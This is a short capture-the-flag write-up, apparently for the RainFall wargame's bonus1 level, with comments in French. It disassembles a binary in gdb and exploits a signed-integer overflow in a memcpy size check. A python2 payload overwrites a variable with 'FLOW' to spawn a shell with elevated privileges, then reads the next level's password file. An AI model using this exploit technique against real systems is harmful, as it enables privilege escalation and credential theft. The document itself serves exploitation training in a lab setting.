memcpy -> dest(0xbffff714), src(2em arg), nb octets * 4

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	    push   ebp
   0x08048425 <+1>:	    mov    ebp,esp
   0x08048427 <+3>:	    and    esp,0xfffffff0
   0x0804842a <+6>:	    sub    esp,0x40             
   0x0804842d <+9>:	    mov    eax,DWORD PTR [ebp+0xc]      # argv[0]
   0x08048430 <+12>:	add    eax,0x4                      # argv[0] + 4 = argv[1]
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]          # recup des char
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>         # atoi(???)
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax     # result de atoi
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9     # comparee a 9
   0x08048446 <+34>:	jle    0x804844f <main+43>          # si <= 9
   0x08048448 <+36>:	mov    eax,0x1                      # exit(1)
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]     # result atoi ds eax
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]              # 
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]      # argv[1] ds eax
   0x0804845d <+57>:	add    eax,0x8                      # argv[1] + 8 = argv[2] 
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]          # string decalee remise dans eax
   0x08048462 <+62>:	mov    edx,eax                      # string dans edx
   0x08048464 <+64>:	lea    eax,[esp+0x14]               # buffer
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx      # 3e arg memcpy (taille)
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx      # 2e arg memcpy (src)
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax          # 1er arg memcpy (dest(esp+0x14)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>       # memcpy(dest, src, taille)
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46 # --> 1464814662
   0x08048480 <+92>:	jne    0x804849e <main+122>         # si != 
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580 # "sh"
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583     # "/bin/sh"
   0x08048499 <+117>:	call   0x8048350 <execl@plt>         # execl("/bin/sh", "sh", NULL)
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
```

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

memcpy 40 ac chiffre negatif unsingn int max

-2147483637 $(python2 -c 'import sys; sys.stdout.write("A" * 40 + "\x46\x4c\x4f\x57")')
-2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

``` bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python2 -c 'import sys; sys.stdout.write("A" * 40 + "\x46\x4c\x4f\x57")')
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```